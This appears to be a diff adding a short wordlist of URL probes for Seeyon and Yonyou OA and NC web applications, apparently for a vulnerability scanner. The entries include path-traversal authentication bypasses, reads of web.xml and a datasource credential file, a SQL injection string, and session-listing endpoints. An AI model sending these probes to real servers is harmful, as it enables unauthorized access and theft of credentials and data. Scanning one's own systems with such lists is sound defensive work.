@@ -1,0 +1,10 @@
+/seeyon/thirdpartyController.do.css/..;/ajax.do
+/seeyon/htmlofficeservlet
+/NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml
+/yyoa/createMysql.jsp
+/yyoa/ext/createMysql.jsp
+/seeyon/webmail.do?method=doDownloadAtt&filename=test.txt&filePath=../conf/datasourceCtp.properties
+/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999) union all select 1,2,(md5(123)),4#
+/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0
+/seeyon/personalBind.do.jpg/..;/ajax.do?method=ajaxAction&managerName=mMOneProfileManager&managerMethod=getOAProfile
+/yyoa/ext/https/getSessionList.jsp?cmd=getAll
